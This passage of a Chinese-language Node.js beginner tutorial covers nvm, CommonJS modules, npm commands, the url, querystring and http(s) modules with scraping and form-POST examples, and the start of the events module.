class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.指定版本来运行</span></span><br><span class="line">nvm run 6.1.2 index.js</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.使用配置文件</span></span><br><span class="line">.nvmrc </span><br><span class="line"><span class="comment">#内容直接写版本号，</span></span><br><span class="line">6.1.2</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">nmp use</span><br><span class="line"><span class="comment">#接下来运行就可以了</span></span><br><span class="line">node index.js</span><br></pre></td></tr></table></figure><h2 id="二-模块-包-与CommonJS"><a href="#二-模块-包-与CommonJS" class="headerlink" title="二. 模块(包)与CommonJS"></a>二. 模块(包)与CommonJS</h2><p><img src="/Node-js-入门/commonjs.png" alt></p><h4 id="Node-js三种模块"><a href="#Node-js三种模块" class="headerlink" title="Node.js三种模块"></a>Node.js三种模块</h4><ol><li><p><strong>内置的Node.js模块</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> os = <span class="built_in">require</span>(<span class="string">'os'</span>)  <span class="comment">// require 载入模块</span></span><br><span class="line"><span class="built_in">console</span>.log(os.hostname()); <span class="comment">// 显示主机名</span></span><br></pre></td></tr></table></figure></li></ol><ol start="2"><li><p><strong>第三方的Node.js模块</strong>(<a href="https://www.npmjs.com" target="_blank" rel="noopener">https://www.npmjs.com</a>)</p><p>​    把包用npm引进来（可以创建配置文件来管理<code>npm init</code>,根据情况填写回撤，会自动创建<code>package.json</code>）</p><p>​    在命令行输入<code>npm install request  --save</code> 安装在配置信息的依赖<code>dependencies</code>里</p><p>​    会在我们的包里面自动创建一个文件夹<code>node_modules</code>, 我们安装的包就会在里面了</p><p>​    载入模块同上</p><p>​    然后开始使用第三方模块</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> request = <span class="built_in">require</span>(<span class="string">'request'</span>)  <span class="comment">//自动先从自己的模块找，找不到就会到我们目录下配置文件夹下找</span></span><br><span class="line"></span><br><span class="line">request(&#123;</span><br><span class="line">  url: <span class="string">'https://api.douban.com/v2/movies/top250'</span>,</span><br><span class="line">  json:<span class="literal">true</span>,</span><br><span class="line">&#125;, (error, response, body) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">JSON</span>.stringfy(body, <span class="literal">null</span>, <span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ol><ol start="3"><li><p><strong>自定义的Node.js模块（要按照CommonJS规范）</strong></p><p>新建一个目录<code>src</code>,里面新建一个js文件(模块)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//自定义模块</span></span><br><span class="line"><span class="keyword">const</span> hello = <span class="function"><span class="params">()</span> =&gt;</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"hello~"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//暴露接口供外部使用(第一个hello是模块的名字，第二个hello是要用的方法)</span></span><br><span class="line"><span class="built_in">module</span>.exports.hello = hello</span><br></pre></td></tr></table></figure><p>调用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> greet = <span class="built_in">require</span>(<span class="string">"./src/greeting.js"</span>)</span><br><span class="line">greet.hello()</span><br></pre></td></tr></table></figure></li></ol><h2 id="三-NPM-包管理工具"><a href="#三-NPM-包管理工具" class="headerlink" title="三. NPM-包管理工具"></a>三. NPM-包管理工具</h2><h4 id="npm使用"><a href="#npm使用" class="headerlink" title="npm使用"></a>npm使用</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm -v</span><br><span class="line">npm info</span><br></pre></td></tr></table></figure><p><strong>镜像源</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看</span></span><br><span class="line">npm config get registry</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置</span></span><br><span class="line">npm config <span class="built_in">set</span> registry http://registry.npmjs.org</span><br></pre></td></tr></table></figure><p><strong>升级node</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#</span></span><br><span class="line">npm install n -g</span><br></pre></td></tr></table></figure><p><strong>查看当前目录下安装了哪些node包</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm ls</span><br></pre></td></tr></table></figure><p><strong>查看当前npm用户</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm whoami</span><br></pre></td></tr></table></figure><p><strong>npm清理缓存</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm cache clean -f</span><br></pre></td></tr></table></figure><p><strong>npm安装模块</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># i = install</span></span><br><span class="line">npm i forever -g  <span class="comment"># 全局</span></span><br><span class="line"></span><br><span class="line">npm install xxx   <span class="comment"># 利用 npm 安装xxx模块到当前命令行所在目录；</span></span><br><span class="line">npm install -g xxx  <span class="comment"># 利用npm安装全局模块xxx；</span></span><br><span class="line">npm install xxx  <span class="comment"># 安装但不写入package.json；</span></span><br><span class="line">npm install xxx –save  <span class="comment"># 安装并写入package.json的”dependencies”中；</span></span><br><span class="line">npm install xxx –save-dev <span class="comment"># 安装并写入package.json的”devDependencies”中。</span></span><br></pre></td></tr></table></figure><p><strong>npm 删除模块</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm uninstall xxx     <span class="comment"># 删除xxx模块；</span></span><br><span class="line">npm uninstall -g xxx  <span class="comment"># 删除全局模块xxx；</span></span><br></pre></td></tr></table></figure><p><strong>更新模块</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm update</span><br></pre></td></tr></table></figure><p><strong>检查模块是否已经过时</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm outdated</span><br></pre></td></tr></table></figure><p>在项目中引导创建一个package.json文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm init</span><br></pre></td></tr></table></figure><p> 发布模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm publish</span><br></pre></td></tr></table></figure><p>查看node安装路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看node安装路径</span><br></pre></td></tr></table></figure><p><strong>npm scripts</strong></p><p>配置文件中</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">"scripts": &#123;</span><br><span class="line">  "test": "echo \"Error: no test sspecified\" &amp;&amp; exit 1"</span><br><span class="line">  "build": "node async.js"</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>按照上面配置完之后，运行只需：<code>npm run build</code></p><p>优点：</p><ul><li>功能相同，可以使用同一个脚本</li></ul><p>详细的下来查文档</p><h2 id="四-深入浅出Node核心模块API"><a href="#四-深入浅出Node核心模块API" class="headerlink" title="四.深入浅出Node核心模块API"></a>四.深入浅出Node核心模块API</h2><h4 id="1-url"><a href="#1-url" class="headerlink" title="1). url"></a>1). url</h4><blockquote><p>记得要导入模块</p></blockquote><h6 id="1-parse"><a href="#1-parse" class="headerlink" title="1.parse"></a>1.parse</h6><p><code>url.parse(urlStr, [parseQueryString], [slashesDenoteHost])</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">url.parse(<span class="string">"https://www.baidu.com"</span>)</span><br><span class="line"># 井号后面是hash</span><br><span class="line">url.parse(<span class="string">"https://www.baidu.com:8080/api.php?from=xp&amp;course=node#level"</span>)</span><br><span class="line"></span><br><span class="line">#第二个参数 parseQueryString 为true时将使用查询模块分析查询字符串，默认为false</span><br><span class="line">url.parse(<span class="string">"https://www.baidu.com"</span>， <span class="literal">true</span>)</span><br><span class="line">#第三个参数 如果设置成true，//foo/bar 形式的字符串将被解释成 &#123; host: ‘foo', pathname: ‘/bar' &#125;</span><br><span class="line">url.parse(<span class="string">"https://www.baidu.com"</span>， <span class="literal">true</span>,<span class="literal">true</span>)</span><br></pre></td></tr></table></figure><h6 id="2-format"><a href="#2-format" class="headerlink" title="2.format"></a>2.format</h6><p>将一个解析后的URL对象、转成、一个格式化的URL字符串。</p><p><code>url.format(urlObj)</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> a = url.format(&#123;</span><br><span class="line">protocol : <span class="string">'http'</span> ,</span><br><span class="line">auth : <span class="literal">null</span> ,</span><br><span class="line">host : <span class="string">'example.com:8080'</span> ,</span><br><span class="line">port : <span class="string">'8080'</span> ,</span><br><span class="line">hostname : <span class="string">'example.com'</span> ,</span><br><span class="line">hash : <span class="literal">null</span> ,</span><br><span class="line">search : <span class="string">'?a=index&amp;t=article&amp;m=default'</span>,</span><br><span class="line">query : <span class="string">'a=index&amp;t=article&amp;m=default'</span>,</span><br><span class="line">pathname : <span class="string">'/one'</span>,</span><br><span class="line">path : <span class="string">'/one?a=index&amp;t=article&amp;m=default'</span>,</span><br><span class="line">href : <span class="string">'http://example.com:8080/one?a=index&amp;t=article&amp;m=default'</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(a);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//输出结果：http://example.com:8080/one?a=index&amp;t=article&amp;m=default</span></span><br></pre></td></tr></table></figure><h6 id="3-resolve"><a href="#3-resolve" class="headerlink" title="3.resolve"></a>3.resolve</h6><p>为URL或 href 插入 或 替换原有的标签，两段解析成一个完整的url</p><p><code>url.resolve(from, to)</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>);</span><br><span class="line"><span class="keyword">var</span> a = url.resolve(<span class="string">'/one/two/three'</span>, <span class="string">'four'</span>) ,</span><br><span class="line">b = url.resolve(<span class="string">'http://example.com/'</span>, <span class="string">'/one'</span>),</span><br><span class="line">c = url.resolve(<span class="string">'http://example.com/one'</span>, <span class="string">'/two'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(a +<span class="string">","</span>+ b +<span class="string">","</span>+ c);</span><br><span class="line"><span class="comment">//输出结果：</span></span><br><span class="line"><span class="comment">///one/two/four</span></span><br><span class="line"><span class="comment">//http://example.com/one</span></span><br><span class="line"><span class="comment">//http://example.com/two</span></span><br></pre></td></tr></table></figure><h4 id="2-QueryString"><a href="#2-QueryString" class="headerlink" title="2). QueryString"></a>2). QueryString</h4><h6 id="1-querystring-escape-str"><a href="#1-querystring-escape-str" class="headerlink" title="1.querystring.escape(str)"></a>1.querystring.escape(str)</h6><p>转义为url编码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">querystring.escape(<span class="string">'&lt;大家好&gt;'</span>)</span><br></pre></td></tr></table></figure><h6 id="2-querystring-unescape-str"><a href="#2-querystring-unescape-str" class="headerlink" title="2.querystring.unescape(str)"></a>2.querystring.unescape(str)</h6><p>反转义</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">querystring.unescape(<span class="string">'%3C%E5%A4%A7%E5%AE%B6%E5%A5%BD%3E'</span>)</span><br></pre></td></tr></table></figure><h6 id="3-querystring-stringify-obj-seq-eq-options"><a href="#3-querystring-stringify-obj-seq-eq-options" class="headerlink" title="3.querystring.stringify(obj,[, seq[, eq[, options]]])"></a>3.querystring.stringify(obj,[, seq[, eq[, options]]])</h6><p>序列化</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>  querystring.stringify(&#123;<span class="attr">name</span>:<span class="string">'chenshuai'</span>,<span class="attr">ago</span>:<span class="number">21</span>,<span class="attr">job</span>:<span class="string">"web"</span>&#125;)</span><br><span class="line"><span class="number">2.</span>   querystring.stringify(&#123;<span class="attr">name</span>:<span class="string">'chenshuai'</span>,<span class="attr">ago</span>:<span class="number">21</span>,<span class="attr">job</span>:<span class="string">"web"</span>&#125;,<span class="string">"."</span>) <span class="comment">//第二个参数可以修改连接的&amp;</span></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> querystring.stringify(&#123;<span class="attr">name</span>:<span class="string">'chenshuai'</span>,<span class="attr">ago</span>:<span class="number">21</span>,<span class="attr">job</span>:<span class="string">"web"</span>&#125;,<span class="string">"."</span>,<span class="string">":"</span>)<span class="comment">//第三个参数可以修改key与value之间的字符串</span></span><br></pre></td></tr></table></figure><h6 id="4-querystring-parse-str-sep-eq-options"><a href="#4-querystring-parse-str-sep-eq-options" class="headerlink" title="4.querystring.parse(str[, sep[, eq[, options]]])"></a>4.querystring.parse(str[, sep[, eq[, options]]])</h6><p>反序列化</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// querystring.parse('字符串','&amp;','=') //默认状态(字符串,分隔符,键与值)</span></span><br><span class="line"><span class="number">1.</span> querystring.parse(<span class="string">'name=chenshuai&amp;ago=21&amp;job=web'</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>querystring.parse(<span class="string">'name=chenshuai.ago=21.job=web'</span>,<span class="string">'.'</span>)<span class="comment">//返序列化时要注意格式</span></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>querystring.parse(<span class="string">'name:chenshuai.ago:21.job:web'</span>,<span class="string">'.'</span>,<span class="string">':'</span>)</span><br></pre></td></tr></table></figure><h4 id="3-http-s-模块"><a href="#3-http-s-模块" class="headerlink" title="3).http(s) 模块"></a>3).http(s) 模块</h4><h6 id="1-get方法"><a href="#1-get方法" class="headerlink" title="1.get方法"></a>1.get方法</h6><p>案例，http小爬虫</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>)</span><br><span class="line"><span class="keyword">var</span> https = <span class="built_in">require</span>(<span class="string">'https'</span>) <span class="comment">//https网站使用(和http的方法是一样的)</span></span><br><span class="line"><span class="keyword">var</span> cherio = <span class="built_in">require</span>(<span class="string">'cherio'</span>) <span class="comment">// 类似于jQuery</span></span><br><span class="line"><span class="keyword">var</span> url = <span class="string">"https://www.lagou.com"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析源代码</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parseMenu</span>(<span class="params">html</span>)</span>&#123;</span><br><span class="line">  <span class="comment">//先导入html，然后再进行处理</span></span><br><span class="line">  <span class="keyword">var</span> $ = cherio.load(html)</span><br><span class="line">  <span class="keyword">var</span> menu = $(<span class="string">'.category-list'</span>)</span><br><span class="line">  <span class="keyword">var</span> menuData = []</span><br><span class="line">  menu.each(<span class="function"><span class="keyword">function</span>(<span class="params">index,value</span>)</span>&#123; <span class="comment">//遍历</span></span><br><span class="line">    <span class="keyword">var</span> menuTitle = $(value).find(<span class="string">'h2'</span>).text() <span class="comment">//一级标题</span></span><br><span class="line">    <span class="keyword">var</span> menuLists = $(value).find(<span class="string">'a'</span>)</span><br><span class="line">    <span class="keyword">var</span> menuList = []</span><br><span class="line">    menuLists.each(<span class="function"><span class="keyword">function</span>(<span class="params">inde, val</span>)</span>&#123; <span class="comment">//遍历</span></span><br><span class="line">      menuList.push($(val).text())  <span class="comment">//a元素的text</span></span><br><span class="line">    &#125;)</span><br><span class="line">    menuData.push(&#123;</span><br><span class="line">      menuTitle:menuTitle,</span><br><span class="line">      menuList:menuList</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">return</span> menuData</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printMenu</span>(<span class="params">menu</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  menu.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">val</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(val.menuTitle + <span class="string">'\n'</span>);</span><br><span class="line">    val.menuList.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">value</span>)</span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(value);</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// get请求</span></span><br><span class="line">https.get(url, <span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> html = <span class="string">''</span>;</span><br><span class="line">  res.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    html += data;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  res.on(<span class="string">'end'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// 打印的是网页源代码</span></span><br><span class="line">    <span class="comment">//console.log(html);</span></span><br><span class="line">    <span class="keyword">var</span> result = parseMenu(html)</span><br><span class="line">    printMenu(result)</span><br><span class="line"></span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  res.on(<span class="string">'error'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(err);</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h6 id="2-Request方法"><a href="#2-Request方法" class="headerlink" title="2.Request方法"></a>2.Request方法</h6><p>GET获取异步数据</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Http模块的request方法的get来获取异步数据 豆瓣电影Top250</span></span><br><span class="line"><span class="keyword">const</span> https = <span class="built_in">require</span>(<span class="string">'https'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> options = &#123;</span><br><span class="line">  hostname: <span class="string">'douban.uieee.com'</span>,</span><br><span class="line">  port: <span class="number">443</span>,</span><br><span class="line">  method: <span class="string">'GET'</span>,</span><br><span class="line">  path: <span class="string">'/v2/movie/top250'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> responseData = <span class="string">''</span></span><br><span class="line"><span class="keyword">var</span> request = https.request(options, (response) =&gt;&#123;</span><br><span class="line">  response.setEncoding(<span class="string">'utf8'</span>)</span><br><span class="line">  response.on(<span class="string">'data'</span>, (chunk)=&gt;&#123;</span><br><span class="line">    responseData += chunk</span><br><span class="line">  &#125;)</span><br><span class="line">  response.on(<span class="string">'end'</span>,()=&gt;&#123;</span><br><span class="line">    <span class="built_in">JSON</span>.parse(responseData).subjects.map(<span class="function">(<span class="params">item</span>) =&gt;</span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(item.title); <span class="comment">// 第一页的电影标题</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">request.on(<span class="string">'error'</span>, (error)=&gt;&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(error);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">request.end()</span><br></pre></td></tr></table></figure><p>POST方法提交表单</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Http模块的request方法的post方法提交表单</span></span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>)</span><br><span class="line"><span class="keyword">const</span> qs = <span class="built_in">require</span>(<span class="string">'querystring'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//序列化</span></span><br><span class="line"><span class="keyword">var</span> postData = querystring.stringfy(&#123;</span><br><span class="line">  <span class="string">'question[title]'</span>:<span class="string">'哈哈哈'</span>,</span><br><span class="line">  <span class="string">'question[content]'</span>:<span class="string">'我的内容'</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> options = &#123;</span><br><span class="line">  hostname: <span class="string">'www.codingke.com'</span>,</span><br><span class="line">  port: <span class="number">80</span>,</span><br><span class="line">  method: <span class="string">'POST'</span>,</span><br><span class="line">  path: <span class="string">'/ajax/course/question'</span></span><br><span class="line">  headers: &#123;  <span class="comment">// 因为登录之后才能提交，所有这里...</span></span><br><span class="line">    <span class="string">'Cookie'</span>:<span class="string">'xxxx'</span>,</span><br><span class="line">    <span class="string">'User-Agent'</span>:<span class="string">'xxxx'</span>,</span><br><span class="line">    <span class="string">'xxx'</span>:<span class="string">'xxx'</span>,</span><br><span class="line">    <span class="string">'Content-Length'</span>:postData.length</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> request = http.request(options, (res) =&gt;&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Status:'</span> + res.statusCode);</span><br><span class="line">  res.setEncoding(<span class="string">'utf8'</span>)</span><br><span class="line">  res.on(<span class="string">'data'</span>, (chunk)=&gt;&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(chunk);</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  res.on(<span class="string">'end'</span>,()=&gt;&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"表单提交完毕"</span>);</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//提交表单</span></span><br><span class="line">request.write(postData)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">request.on(<span class="string">'error'</span>, (error)=&gt;&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(error);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">request.end()</span><br></pre></td></tr></table></figure><h4 id="4-Events事件模块"><a href="#4-Events事件模块" class="headerlink" title="4).  Events事件模块"></a>4).  Events事件模块</h4><p>使用事件: <code>EventEmitter</code>类</p><p>事件的参数</p><p>只执行一个的事件监听器</p><p>比如：更新、发布 都是一个事件</p><p>小例子:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> EventEmitter = <span class="built_in">require</span>(<span class="string">'events'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Player</span> <span class="keyword">extends</span> <span class="title">EventEmitter</span></span>&#123;&#125;  <span class="comment">//继承类</span></span><br><span class="line"><span class="comment">//实例化对象</span></span><br><span class="line"><span class="keyword">var</span> player = <span class="keyword">new</span> Player()</span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义一个函数(不过我这里是用的匿名函数)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ev1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"嘻嘻"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//监听事件(这里用的匿名函数)</span></span><br><span class="line">player.on(<span class="string">'play'</span>, (track)=&gt;&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`正在播放: 《<span class="subst">$&#123;track&#125;</span>》`</span>);</span><br><span class="line">&#125;)</span><br><span 